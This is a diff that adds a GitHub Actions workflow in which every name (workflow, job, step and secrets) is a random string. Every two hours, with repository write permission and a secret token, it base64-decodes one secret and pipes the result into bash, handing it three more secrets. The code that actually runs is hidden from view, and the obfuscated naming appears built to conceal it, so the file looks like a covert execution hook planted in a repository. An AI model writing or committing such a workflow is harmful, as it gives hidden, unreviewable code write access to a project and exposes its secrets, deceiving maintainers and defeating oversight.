@@ -1,0 +1,21 @@
+name: RpRzD7xwIb1Of
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  WMIDDwG7ohA1cnh8:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.uy0SmhHg }}
+      - name: upXpdjn5NBVo
+        env:
+          JXgucy: ${{ secrets.U8d9z }}
+          Q8uqtB77kF: ${{ secrets.Tq4oRI }}
+          qwQr1: ${{ secrets.s7LZDjd }}
+          GITHUB_TOKEN: ${{ secrets.uy0SmhHg }}
+        run: echo "$JXgucy" | base64 -d | bash
